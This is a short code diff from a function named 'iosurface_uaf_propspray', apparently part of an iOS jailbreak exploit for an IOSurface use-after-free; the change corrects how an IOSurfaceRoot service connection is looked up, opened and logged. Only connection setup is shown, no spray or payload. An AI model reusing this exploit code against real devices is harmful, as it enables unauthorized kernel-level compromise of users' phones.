@@ -47235,7 +47235,7 @@ void iosurface_uaf_propspray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull don
 
         // Open IOSurface UserClient connection
         typedef void*(*matchfn)(const char*);
-        typedef int(*getfn)(unsigned int, void*, unsigned int*);
+        typedef unsigned int(*getfn)(unsigned int, void*);
         typedef int(*openfn)(unsigned int, unsigned int, uint32_t, unsigned int*);
         typedef int(*closefn)(unsigned int);
 
@@ -47247,10 +47247,9 @@ void iosurface_uaf_propspray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull don
         unsigned int conn = 0;
         {
             void *md = sym_match("IOSurfaceRoot");
-            unsigned int svc = 0;
-            int gkr = sym_get(0, md, &svc);
+            unsigned int svc = sym_get(0, md);
             int okr = sym_open(svc, mach_task_self(), 0, &conn);
-            log([NSString stringWithFormat:@"JB70: HH0 conn=%u svc=%u gkr=%d okr=0x%x", conn, svc, gkr, okr]);
+            log([NSString stringWithFormat:@"JB70: HH0 conn=%u svc=%u okr=0x%x", conn, svc, (unsigned)okr]);
         }
 
         if (!conn) {
